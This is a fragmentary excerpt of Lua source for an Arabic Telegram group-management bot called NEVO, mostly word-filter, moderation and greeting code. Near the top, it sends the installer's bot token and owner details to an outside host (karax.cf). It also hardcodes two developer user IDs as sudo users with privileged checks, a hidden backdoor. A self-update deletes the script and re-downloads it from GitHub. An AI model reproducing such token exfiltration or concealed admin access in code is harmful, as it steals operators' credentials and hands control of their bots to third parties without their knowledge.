...
https.request('http://karax.cf/NEVO/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./NEVO.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("BK", "w")  
...
sudo_users = {SUDO,1152146824,1033028167}   
...
if tonumber(user_id) == tonumber(1152146824) then  
var = true  
...
NEVO_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
NEVO_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
NEVO_Msg = 'ملك التفاعل' 
...
function plugin_NEVOa(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.NEVOa and msg then
pre_msg = plugin.NEVOa(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function SourceNEVO(msg,data) -- بداية العمل
if msg then
...
SourceNEVOr = ' ゠ههلو حياتي 💕⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceNEVOr) 
end
end
...
send(msg.chat_id_, msg.id_,NEVO_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf NEVO.lua')
os.execute('wget https://raw.githubusercontent.com/NEVOTEAM/NEVO/master/NEVO.lua')
...
usertext = '\n܁༯┆ههلو حياتي 💕 ܰ ['..result.title_..'](t.me/'..(username or 'NEVO')..')'
...
usertext = '\n܁༯┆ههلو حياتي 💕 ܰ ['..data.first_name_..'](t.me/'..(data.username_ or 'NEVO')..')'
status  = '\n☑️┆ تم ترقيته مطور في البوت'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n📤┆ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'NEVO')..')'
status  = '\n☑️┆ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n👤┆العضو » '..userid..''
...
local NEVO1_Msg = database:get(bot_id.."NEVO1:Add:Filter:Rp2"..text..msg.chat_id_)   
if NEVO1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┆ العضو ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'NEVO')..') \n 📬┆'..NEVO1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if NEVO_Msg and not Special(msg) then  
local NEVO_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if NEVO_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┆["..NEVO_Msg.."] \n") 
else
send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](t.me/fffftz)}\n🚫┆["..NEVO_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "܁༯┆عذرأ يا  ◃ ["..data.first_name_.."](t.me/fffftz)  💕 ܰ\n܁༯┆الملصق التي ارسلتهاا تم منعهاا من المجموعةه  💕 ܰ\n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
メ .NEVO TEAM. メ
≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫
彡 .[𝘚𝘰𝘶𝘳𝘤𝘦 𝘊𝘩𝘢𝘯𝘯𝘦𝘭](t.me/b6661)≪ 

彡 .[𝘋𝘦𝘝 #1](t.me/iNiVo)≪

彡 .[𝘋𝘦𝘝 #2](t.me/vvvzvv)≪

彡 .[𝘚𝘰𝘶𝘳𝘤𝘦  𝘍𝘪𝘭𝘦𝘴](t.me/fffftz)≪

彡 .[𝘛𝘸𝘴 𝘚𝘰𝘶𝘳𝘤𝘦](t.me/IIIS1)≪
≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
Text = [[
≪━━━━━━━━━≫
彡[DEV SOURCE](t.me/iNiVo)彡
彡[DEV SOURCE](t.me/vvvzvv)彡
≪━━━━━━━━━≫
]]
send(msg.chat_id_, msg.id_,Text)
return false
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤┆ بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'NEVO')..') \n☑️┆ تـم قفـل السيلفي بالتقييد\n⛔┆ الحاله ←التقييد ')  
end,nil)   
...
local UserName = (b.username_ or "NEVO")
...
usertext = '\n👤┆ المستخدم » ['..result.title_..'](t.me/'..(username or 'NEVO')..')'
...
usertext = '\n👤┆ العضو » ['..result.title_..'](t.me/'..(username or 'NEVO')..')'
status  = '\n☑️┆ تم الغاء حظره من هنا'
texts = usertext..status
else
...
database:set(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 💕 ܰ")  
database:set(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."NEVO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."NEVO1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 💕 ܰ")  
database:del(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."NEVO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."NEVO1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."NEVO1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 💕 ܰ ")  
database:set(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."NEVO1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."NEVO1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."NEVO1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."NEVO1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."NEVO1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."NEVO1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💕◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local NEVO_Msg = database:get(bot_id.."NEVO1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..NEVO_Msg.."◜\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n܁༯┆ههلو حياتي 💕 ܰ ['..result.title_..'](t.me/'..(text1[3] or 'NEVO')..')'..'\n☑️┆ تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'📌┆ عدد المجموعات الان » { '..#group..' }'..NEVOk..''..NEVO..'\n*☑️┆ الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
NEVO = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(NEVO)
...
--------------------------------------------------------------------------------------------------------------
SourceNEVO(data.message_,data)
plugin_NEVOa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local NEVObot = database:get(bot_id.."NEVO1:Add:Filter:Rp2"..text..result.chat_id_)   
if NEVObot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┆العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┆["..NEVObot.."] \n") 
...
------------------------------------------------------------------------
if text then
local NEVO1_Msg = database:get(bot_id.."NEVO1:Add:Filter:Rp2"..text..result.chat_id_)   
if NEVO1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┆"..NEVO1_Msg)
